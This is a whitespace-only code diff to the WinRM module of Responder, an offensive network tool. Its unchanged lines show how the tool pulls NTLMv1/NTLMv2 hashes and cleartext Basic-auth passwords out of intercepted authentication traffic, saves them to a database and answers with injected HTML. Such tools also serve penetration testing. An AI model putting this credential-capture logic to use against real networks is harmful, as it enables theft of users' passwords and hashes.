@@ -1,5 +1,5 @@
 #!/usr/bin/env python
-# This file is part of Responder, a network take-over set of tools 
+# This file is part of Responder, a network take-over set of tools
 # created and maintained by the watchers.
 # email: providence@tao.oga
 # This program is free software: you can redistribute it and/or modify
@@ -33,7 +33,7 @@ def ParseHTTPHash(data, Challenge, client, module):
 	LMhashOffset = struct.unpack('<H',data[16:18])[0]
 	LMHash       = data[LMhashOffset:LMhashOffset+LMhashLen]
 	LMHashFinal  = codecs.encode(LMHash, 'hex').upper().decode('latin-1')
-	
+
 	NthashLen    = struct.unpack('<H',data[20:22])[0]
 	NthashOffset = struct.unpack('<H',data[24:26])[0]
 	NTHash       = data[NthashOffset:NthashOffset+NthashLen]
@@ -48,12 +48,12 @@ def ParseHTTPHash(data, Challenge, client, module):
 		HostName        = data[HostNameOffset:HostNameOffset+HostNameLen].decode('latin-1').replace('\x00','')
 		WriteHash       = '%s::%s:%s:%s:%s' % (User, HostName, LMHashFinal, NTHashFinal, Challenge1)
 		SaveToDb({
-			'module': module, 
-			'type': 'NTLMv1', 
-			'client': client, 
-			'host': HostName, 
-			'user': User, 
-			'hash': LMHashFinal+':'+NTHashFinal, 
+			'module': module,
+			'type': 'NTLMv1',
+			'client': client,
+			'host': HostName,
+			'user': User,
+			'hash': LMHashFinal+':'+NTHashFinal,
 			'fullhash': WriteHash,
 		})
 
@@ -67,10 +67,10 @@ def ParseHTTPHash(data, Challenge, client, module):
 		HostName       = data[HostNameOffset:HostNameOffset+HostNameLen].decode('latin-1').replace('\x00','')
 		WriteHash      = '%s::%s:%s:%s:%s' % (User, Domain, Challenge1, NTHashFinal[:32], NTHashFinal[32:])
 		SaveToDb({
-			'module': module, 
-			'type': 'NTLMv2', 
-			'client': client, 
-			'host': HostName, 
+			'module': module,
+			'type': 'NTLMv2',
+			'client': client,
+			'host': HostName,
 			'user': Domain + '\\' + User,
 			'hash': NTHashFinal[:32] + ':' + NTHashFinal[32:],
 			'fullhash': WriteHash,
@@ -113,11 +113,11 @@ def PacketSequence(data, client, Challenge):
 		ClearText_Auth = b64decode(''.join(Basic_Auth))
 
 		SaveToDb({
-			'module': 'WinRM', 
-			'type': 'Basic', 
-			'client': client, 
-			'user': ClearText_Auth.decode('latin-1').split(':')[0], 
-			'cleartext': ClearText_Auth.decode('latin-1').split(':')[1], 
+			'module': 'WinRM',
+			'type': 'Basic',
+			'client': client,
+			'user': ClearText_Auth.decode('latin-1').split(':')[0],
+			'cleartext': ClearText_Auth.decode('latin-1').split(':')[1],
 			})
 
 		Buffer = IIS_Auth_Granted(Payload=settings.Config.HtmlToInject)
@@ -158,7 +158,7 @@ class WinRM(BaseRequestHandler):
 					data += buff
 					remaining -= len(buff)
 					#check if we recieved the full header
-					if data.find('\r\n\r\n') != -1: 
+					if data.find('\r\n\r\n') != -1:
 						#we did, now to check if there was anything else in the request besides the header
 						if data.find('Content-Length') == -1:
 							#request contains only header
@@ -177,8 +177,8 @@ class WinRM(BaseRequestHandler):
 				else:
 					Buffer = PacketSequence(data,self.client_address[0], Challenge)
 					self.request.send(NetworkSendBufferPython2or3(Buffer))
-		
+
 		except:
 			self.request.close()
 			pass
-			
+
